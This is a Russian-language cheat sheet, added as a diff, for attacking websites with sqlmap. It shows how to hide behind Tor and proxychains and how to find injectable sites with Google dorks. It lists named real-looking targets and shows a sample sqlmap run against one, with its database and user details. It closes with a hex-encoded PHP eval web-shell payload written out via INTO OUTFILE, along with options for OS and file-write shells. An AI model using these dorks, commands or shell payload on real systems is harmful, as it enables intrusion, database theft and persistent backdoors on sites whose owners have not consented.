@@ -1,0 +1,114 @@
+####mini-man SQLmap####
+
+######АНОНИМНОСТЬ######
+Пред тем как все делать не забудем про анонимность
+Есть сотни путей достижения анонимности, но рассмотрим простые
+1) Первый способ (Использовался он). Настройка proxychain (все делалось из под root, поэтому без sudo). Стандартный proxychain уже устарел и не поддерживается, и поэтому сообщество развивает proxychain4. Его и рекомендуется установить.
+
+#Устанавливаем tor и torsocks (torsocks входит по умолчанию в тор, но это бывает не во всех репозиториях)
+apt-get install torsocks tor
+#В самый конец файла /etc/tor/torrc добавьте строки:
+AutomapHostsOnResolve  1
+DNSPort                53530
+TransPort              9040
+#Запускаем сервис tor 
+systemctl start tor
+#Если вдруг хотите добавить в автозагрузку (помойму) - systemctl enable tor
+#Как только порабоете и захотите выключить - systemctl stop tor
+#Узнать вообще запущен ли тор - systemctl status tor (рекомендуется перезапускать тор, перед началом каких-то планов)
+#Далее устанавливаем 
+apt-get install git gcc
+#Удаляем старый proxychain 
+apt-get remove proxychains
+git clone https://github.com/rofl0r/proxychains-ng.git
+cd proxychains-ng/
+./configure --prefix=/usr --sysconfdir=/etc
+make
+sudo make install
+sudo make install-config
+
+После установки проверяем работает ли proxychain4 (должны быть разные ip)
+Сначала: curl suip.biz/ip/ Потом: proxychains4 curl suip.biz/ip/ 
+И на всякий случай сначала проверяем так: wget -O - -q icanhazip.com Потом: proxychains4 wget -O - -q icanhazip.com
+
+2) Второй способ это пользоваться встроенными функциями sqlmap (из минусов ты толком не видишь работает ли все через прокси или тор)
+#Для тора который  ты включил. Тор всегда по умолчания на порту 9150
+--proxy=socks5://127.0.0.1:9150 
+#Если вдруг, кто-то захочет использовать иные прокси, то это просто --proxy='http,socks'://ip:port
+
+3) Третий способ. Также в sqlmap есть встроенная функция использования tor
+#Включает работу через сеть tor
+--tor
+--tor-port=9050
+--tor-type=SOCKS5
+#check-tor должна автоматически проверять работает ли тор или нет, и если нет то предупредит пользователя
+--check-tor 
+
+######GOOGLE_DORKS######
+Для поиска sql инъекций воспользуемся google_dorks
+Используя вот эти простые самописные дорки для поиска порносайтов, можно найти и те которые уязвимы к инъекциям
+inurl:sex.php?id=
+inurl:xxx.php?id=
+Также приложил небольшую коллекцию дорков для поиска SQL_injection в файле dorks.txt
+В sqlmap, есть таккже есть функция автоматического использования дорков, однако гугл это переодически палит
+-g news-read.php?id=
+С помощью дрков найдены следующие ссылки:
+http://www.predatorsoft.com/xxx/porn.php?xxx=2263
+http://sex-korifan.ru/sex.php?id=1
+http://hexonline.co.uk/Product.php?cid=63
+http://117.239.10.19/davweb/coursefeedetails.php?id=30281
+
+######SQLmap######
+Самые полные и крутые материалы по ману (описаны все опции и подробно):
+https://github.com/sqlmapproject/sqlmap/wiki/Usage
+http://packetstorm.foofus.com/papers/cheatsheets/sqlmap-cheatsheet-1.0-SDB.pdf
+######enumeration######
+По опциям все подробно описанно в ссылках выше. Но вкратце по тому что используется:
+-o - Активирует сразу три опции (--threads=3 - использую 3 потока http; --keep-alive - использует постоянное соединение; --null-connection - получает только длинну http запроса, а не все тело и это позволяет использовать дополнительный способ слепой инъекции)
+--random-agent - рандомный юзер_агент браузера
+-b или --banner - исследовать банер (для определения версии)
+--is-dba - Проверяет запущена ли база из под админской учеткой базы данных (в базах это пользователь DBM) или нет
+--current-user - проверяет под каким пользователем выполняются запросы из вебки в БД
+--fingerprint или -f - выводит более точную инфу о базе + ОС + инфа о сервере (обычно только версию PHP  и что за сервер)
+--tables - таблицы выводит
+--dump - делает дамп (пример где хранится: /.sqlmap/output/sex-korifan.ru/dump/sex_korifanbaza-a31b2aa6)
+Часто используемые опции:
+-u URL                     Вводим адрес атакуемого ресурса
+-g GOOGLEDORK    Вводим данные для использоавния дорков гугла
+--random-agent       Подменяем юзер-агент на случайный из базы
+--proxy=PROXY       Используем прокси для соеденения
+--tor                         Используем Тор для соеденения
+--level=LEVEL          Уровни для тестирования (1-5, по умолчанию 1)
+--risk=RISK              Расширенные наборы тестов (1-3, по умолчанию 1)
+--banner                  Запрос баннера ресурса
+--current-user         Запрос юзер-агента
+--current-db            Запрос СУБД
+--passwords            Запрос на сохраненные пароли
+--tables                    Запрос на нумерацию таблиц
+--columns                Запрос на нумерацию столбцов
+--dump                    Запрос на формирование дампа
+-D DB                       Выбор базы данных
+-T TBL                      Выбор таблицы
+-C COL                     Выбор столбца таблицы
+--dbs                       Нумерация баз данных
+--tamper                 Скрипты для нахождения обхода защиты
+
+Пример:
+proxychains4 sqlmap -u http://sex-korifan.ru/sex.php?id=1 --random-agent -o --banner --current-db --current-user --is-dba
+Вывод:
+web application technology: Nginx, PHP 5.4.16
+back-end DBMS: MySQL 5.0
+banner:    '5.5.50-MariaDB'
+current user:    'sex-korifanbaza@localhost'
+current database:    'sex-korifanbaza'  //Это только текущая БД их может быть несколько, чтобы посмотреть все вместо этого юзать --dbs
+current user is DBA:    False 
+
+Для шела:
+1)
+SELECT 0x3c3f706870206576616c286261736536345f6465636f646528245f524551554553545b636d645d29293b203f3e INTO OUTFILE "/var/www/vhosts/03a2...............com/shell.php"
+2)--sql-shell
+3)--os-shell
+4)--keep-alive --data="параметры id" --file-write="shell.php" --file-dest="/полный путь/шелл"
+
+
+ 
